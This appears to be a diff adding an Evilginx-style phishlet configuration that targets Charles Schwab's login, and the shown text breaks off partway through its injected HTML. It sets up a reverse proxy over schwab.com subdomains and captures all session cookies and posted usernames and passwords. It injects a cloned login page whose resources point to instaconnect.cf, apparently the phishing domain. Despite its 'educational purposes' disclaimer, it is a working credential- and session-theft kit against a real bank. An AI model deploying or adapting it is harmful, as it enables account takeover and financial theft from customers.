@@ -1,0 +1,190 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@Anon'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'schwab.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'schwab.com', session: true, is_landing: false}
+  - {phish_sub: 'lms', orig_sub: 'lms', domain: 'schwab.com', session: true, is_landing: false}
+  - {phish_sub: 'client', orig_sub: 'client', domain: 'schwab.com', session: true, is_landing: false}
+
+# tags.tiqcdn.com
+# cempa.instaconnect.cf
+# chat.instaconnect.cf
+sub_filters:
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'schwab.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: '', domain: 'schwab.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'client', domain: 'schwab.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+# url = 'https://'+ LMSdomain+ '/Login?ClientId='+ ClientID + '&Region='+ Region + '&RedirectUri='+ 'https://' + ClientBuddy + '/Login/Signon/AuthCodeHandler.ashx';
+
+auth_tokens:
+  - domain: '.schwab.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/'    
+credentials:
+  username:
+    key: 'leaked_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'leaked_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'lms.schwab.com'
+  path: '/Login?ClientId=schwab-secondary&Region=&RedirectUri=https://client.{domain}/Login/Signon/AuthCodeHandler.ashx&StartInSetId=1'
+
+# document.getElementsByName("loginIframe")[0].setAttribute("sandbox", "allow-same-origin allow-scripts allow-popups allow-forms");
+js_inject:
+  - trigger_domains: ["lms.schwab.com"]
+    trigger_paths: ["/Login"]
+    trigger_params: []
+    script: |  
+     function onclickListener(){
+        document.body.innerHTML = `<html><head><script type="text/javascript" async="async" src="https://smetric.instaconnect.cf/b/ss/cschwabschwabprod/10/JS-2.1.0/s07419775253325?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=1%2F9%2F2020%2012%3A53%3A7%204%20-330&amp;sdid=76D08E1FFE8BA67F-58E5BEFBAD4E8A9A&amp;mid=86755091214635122834267687694675050866&amp;ce=UTF8&amp;ns=charlesschwab&amp;cdp=2&amp;fpCookieDomainPeriods=2&amp;pageName=%2Fprospects%2Fpublic%2Fschwab%2Fnn%2Flogin%2Flogin.html&amp;g=https%3A%2F%2Fwww.instaconnect.cf%2Fpublic%2Fschwab%2Fnn%2Flogin%2Flogin.html&amp;cc=USD&amp;ch=%2Fprospects&amp;c1=%2Fprospects%2Fpublic%2Fschwab%2Fnn%2Flogin%2F&amp;v1=D%3Dc1&amp;h1=D%3Dc3&amp;c2=%2Fprospects%2Fpublic%2Fschwab%2Fnn%2Flogin%2F&amp;v2=D%3Dc2&amp;c3=%2Fprospects%2Fpublic%2Fschwab%2Fnn%2Flogin%2F&amp;v3=D%3Dc3&amp;c4=Charles%20Schwab%20and%20Co.%2C%20Inc%20%7C%20Login&amp;v4=D%3Dc4&amp;c5=D%3Dg&amp;v5=D%3Dg&amp;c7=8&amp;v7=8&amp;c11=1&amp;v11=1&amp;c14=en-US&amp;c15=Thursday&amp;v15=Thursday&amp;c16=3%3A00AM&amp;v16=3%3A00AM&amp;v18=D%3DpageName&amp;v36=%2B1&amp;c39=%2Fprospects%2Fpublic%2Fschwab%2Fnn%2Flogin%2Flogin.html&amp;v39=%2B1&amp;c40=yes&amp;v40=%2B1&amp;v56=AQ2d%2BUfN5%2FQdd6HNonU31i4nu2thEtg5GysCAC%2B7olpc%3D&amp;c60=Schwab%20Brokerage&amp;c61=Support&amp;c62=Website&amp;c63=Risk&amp;v67=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A81.0%29%20Gecko%2F20100101%20Firefox%2F81.0&amp;c68=Page&amp;c69=VisitorAPI%20Present&amp;v69=VisitorAPI%20Present&amp;v71=86755091214635122834267687694675050866&amp;c73=72%7C72%7C869.5166702270508&amp;v86=prospect&amp;s=1536x864&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=831&amp;bh=750&amp;mcorgid=5DB5123F5245B1D20A490D45%40AdobeOrg&amp;AQE=1"></script><!--WAMCHECK:97007:fe514ba0-424f-4d5d-a72b-419465b4be52:GOOD:END--><title>Charles Schwab and Co., Inc | Login</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="keywords" content="">
+        <meta name="description" content="">
+        <meta name="tag" content="">
+        <meta name="author" content="">
+        <meta name="updated" content="">
+        <meta name="businessline" content="Schwab Brokerage">
+        <meta name="subject-lvl1" content="Support">
+        <meta name="subject-lvl2" content="Website">
+        <meta name="category" content="Risk">
+        <meta name="segment" content="">
+        <meta name="formattype" content="Page">
+        <meta name="lifeevent" content="">
+        <meta name="experiencelevel" content="">
+        <meta name="restriction" content="">
+        <meta name="virtual_slug" content="">
+        <meta name="virtual_path" content="">
+        <link rel="image_src" href="">
+        <link rel="canonical" href="https://www.instaconnect.cf/public/schwab/nn/login/login.html">
+        <link rel="prev" href="">
+        <link rel="next" href=""><meta name="viewport" content="width=1024, initial-scale=1.0"> 
+        <!-- TAG-899/TAG-1139 : Removed extra utag.js and utag.sync.js asset calls -->
+        <style id="abu-collapse-styles" type="text/css"></style></head><body><iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px none; display: none;"></iframe><script type="text/javascript" async="" charset="utf-8" id="utag_93" src="https://s.yimg.com/wi/ytc.js"></script><script src="//tags.tiqcdn.com/utag/schwab/global-public/prod/utag.js" type="text/javascript" defer=""></script><script type="text/javascript">
+        try {
+        if (window.localStorage.getItem('CarouselPrompted'))
+            window.localStorage.removeItem('CarouselPrompted');
+        } catch (ex) {
+        }   
+        //PSD-4903
+        var waPerfName="/public/schwab/nn/login/login.html";
+        </script>
+        <!--<style>-->
+        <meta name="viewport" content="width=1140">
+        <link type="text/css" rel="stylesheet" href="/public/file/PROSPECT-CSS/ps.css">
+        <style type="text/css">
+        .navi-P-7976015 {display:none !important}
+        @font-face { 
+        font-family:'CharlesModern';font-weight:normal;font-style:normal; 
+        src: url('/public/file/P-6220301/CharlesModern-Regular.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-Regular.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-Regular.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-Regular.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-Regular.svg#CharlesModern-Regular') format('svg')
+        } 
+        @font-face {font-family:'CharlesModern';font-weight:normal;font-style:italic; 
+        src: url('/public/file/P-6220301/CharlesModern-Italic.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-Italic.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-Italic.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-Italic.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-Italic.svg#CharlesModern-Italic') format('svg')
+        } 
+        @font-face {font-family:'CharlesModern';font-weight:bold;font-style:normal; 
+        src: url('/public/file/P-6220301/CharlesModern-Bold.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-Bold.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-Bold.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-Bold.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-Bold.svg#CharlesModern-Bold') format('svg')
+        } 
+        @font-face {font-family:'CharlesModern';font-weight:bold;font-style:italic; 
+        src: url('/public/file/P-6220301/CharlesModern-BoldItalic.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-BoldItalic.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-BoldItalic.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-BoldItalic.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-BoldItalic.svg#CharlesModern-BoldItalic') format('svg')
+        }
+        @font-face {font-family:'CharlesModern';font-weight:300;font-style:normal; 
+        src: url('/public/file/P-6220301/CharlesModern-Light.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-Light.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-Light.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-Light.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-Light.svg#CharlesModern-Light') format('svg')
+        } 
+        @font-face {font-family:'CharlesModern';font-weight:300;font-style:italic; 
+        src: url('/public/file/P-6220301/CharlesModern-LightItalic.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-LightItalic.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-LightItalic.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-LightItalic.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-LightItalic.svg#CharlesModern-Light') format('svg')
+        } 
+        /* deprecated please font-weight:300 to access light ******************************/
+        @font-face {font-family:'CharlesModernLight';font-weight:normal;font-style:normal; 
+        src: url('/public/file/P-6220301/CharlesModern-Light.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-Light.eot?') format('embedded-opentype'), 
+        url('/public/file/P-6220301/CharlesModern-Light.woff') format('woff'), 
+        url('/public/file/P-6220301/CharlesModern-Light.ttf') format('truetype'), 
+        url('/public/file/P-6220301/CharlesModern-Light.svg#CharlesModern-Light') format('svg')
+        } 
+        @font-face {font-family:'CharlesModernLight';font-weight:normal;font-style:italic; 
+        src: url('/public/file/P-6220301/CharlesModern-LightItalic.eot'); 
+        src: url('/public/file/P-6220301/CharlesModern-LightItalic.eot?') format('embedded-opentype'), 
+       url('/public/file/P-6220301/CharlesModern-LightItalic.woff') format('woff'), 
+       url('/public/file/P-6220301/CharlesModern-LightItalic.ttf') format('truetype'), 
+       url('/public/file/P-6220301/CharlesModern-LightItalic.svg#CharlesModern-Light') format('svg')
+        }
+        /* end deprecated please font-weight to access light ******************************/
+        </style>
+        <script type="text/javascript" src="/secure/asset/short/?cmsid=PS-HEAD-SCRIPT-BUNDLE">var _x;</script><style>@media print {#ghostery-purple-box {display:none !important}}</style>
+        <!-- BEGIN: Marin Placeholder Script -->
+        <script type="text/javascript">
+        var _marinTrack=new Object({getKeyValues:function(){},setClientId:function(a){},getClientId:function(){},setHost:function(a){},getHost:function(){},setExpires:function(a){},getExpires:function(a){},trackPage:function(){},firstHit:function(){},processOrders:function(){}});
+        </script>
+        <!-- END: Marin Placeholder Script --><script type="text/javascript">
+        var APTload = true;
+        </script>
+        <script type="text/javascript">
+        var waEnvId = "PROD";
+        var tmsActiveDomain= "www.instaconnect.cf";
+        var tmsActiveDomainDWT= "client.instaconnect.cf";
+        var re = new RegExp("lang=[^;]+", "i");
+        if (document.cookie.match(re)) {
+        if(document.cookie.match(re)[0].split("=")[1] == "zh-TW") {
+            var waLanguage = "zh-TW";
+        } 
+        }
+        </script>
+        <script type="text/javascript">
+        var proactiveChatHost= "cempa.instaconnect.cf";
+        var reactiveChatHost= "chat.instaconnect.cf";
+        if(window.location.hostname.indexOf('client-test1.instaconnect.cf') != -1) {
+        proactiveChatHost= "cempa-pp.dev.instaconnect.cf";
+        reactiveChatHost= "chat-pp.dev.instaconnect.cf";
+        }
+        </script>
+        <script>
+        var waCategoryName= "prospects";
+        var waPageName= "/public/schwab/nn/login/login.html";
+        </script>
+        <script src="/system/asset?cmsid=PS-TAG-HEADER&amp;filename=hbx.js"></script>
+        <style rel="stylesheet">@import url("https://www.instaconnect.cf/public/file?cmsid=LOGIN-STYLES&filename=main.css");</style>
+        <script type="text/javascript">function openPopup(url,width,height,name,left,top,properties){if(isValidUrl(url))window.open(url,((name&&name!="")?name:"popup"),((width&&width!="")?"width="+width+",":"")+((height&&height!="")?"height="+height+",":"")+((properties&&properties!="")?properties:"status=yes,toolbar=no,menubar=no,location=no,scrollbars=yes,resizable=yes")+((left&&left!="")?",left="+left:"")+((top&&top!="")?",top="+top:""))}function menuLink(menu){var link=menu.options[menu.selectedIndex], url=link.getAttribute("value"),target=link.getAttribute("target");if(link.getAttribute("popup")=="true"){openPopup(url,link.getAttribute("popupwidth"),link.getAttribute("popupheight"),target)}else if(isValidUrl(url)){if(url.indexOf("javascript:")!=-1){eval(url.substr(url.indexOf(":")+1))}else if(target&&target!=""){if(target=="_top")window.top.location.href=url;else if(target.substr(0,1)!="_")window.parent.frames[target].location.href=url;else window.location.href=url}else{window.location.href=url}}menu.selectedIndex=0}function isValidUrl(url){return!(typeof(url)=="undefined"||url==null||url==""||url.toLowerCase()=="none"||url.toLowerCase()=="null"||url=="-1")}</script>
+           <script>!function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="EX83G-QNMSL-P9787-NRSC7-7EJJ3",function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,_,o,r=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);r.src="javascript:void(0)",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="width:0;height:0;border:0;display:none;",o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(r,o);try{_=r.contentWindow.document}catch(O){i=document.domain,r.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",_=r.contentWindow.document}_.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"EX83G-QNMSL-P9787-NRSC7-7EJJ3",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},_.write("<bo"+'dy onload="document._l();">'),_.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e=""=="true"?1:0,t="",n="rjcpebdil2eb6x3vpspa-f-c343914ef-clientnsv4-s.akamaihd.net",i={"ak.v":"28","ak.cp":"267662","ak.ai":parseInt("179883",10),"ak.ol":"0","ak.cr":8,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"317f071","ak.r":19610,"ak.a2":e,"ak.m":"x","ak.n":"essl","ak.bpcip":"138.68.242.0","ak.cport":33260,"ak.gh":"165.254.96.28","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"bbr","ak.t":"1601535134","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==y0461+fnM9FmKl6OKzfak8qgd6C+jlsfU1TTlSytUZw6cRrqx2tn2ILsHYpENiOxYHoDI6CR0kOO66bB5IUlIORakSWypQI6VJ3b8rUTmpgui/VoerW8xaB1TSrLgBJKILs0sPs4AsaPiaW0uGZIb4NIC9q/Eh0nBT69bZ/PmVVRN5fMgzgb/J0EkWgJ+2vg/rbIlgDvqJn/ncY2CPW25NqhpptmmAf5vYe4Ul/PfSnhNPczLoCXir7wgKNrttQetzM8785P9VYTodSMQ2k98Xg5rnJfNOHKIHJ6zBDiwaDVUcAE+7LyI6XrAqxBMDQNJH0RQzEwrmQoWn6VCRR2dR+2g6LpWqbqE3z1goEczpAGr0BGCGGSA0frvnCBHVNtuZLIpl3F8JCAzkCbZ+OSpnBxH8h9eyihAJCxFZsCTCo=","ak.pv":"84","ak.dpoabenc":""};if(""!==t)i["ak.ruds"]=t;var _={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))i["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(i)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:i,akDNSPreFetchDomain:n,init:function(){if(!_.i){var a=BOOMR.subscribe;a("before_beacon",_.av,null,null),a("onbeacon",_.rv,null,null),_.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script><script>bazadebezolkohpepadr="807184791"</script><script type="text/javascript" src="https://www.instaconnect.cf/akam/11/301cab23" defer=""></script>
+                <meta charset="utf-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <link href="/bundles/styles/lib/login-component-responsive-secondary?v=_jdeAevgOU6R2aUByCuKsDl9p63BfFtUVM2tGcqdz8Y1" rel="stylesheet">
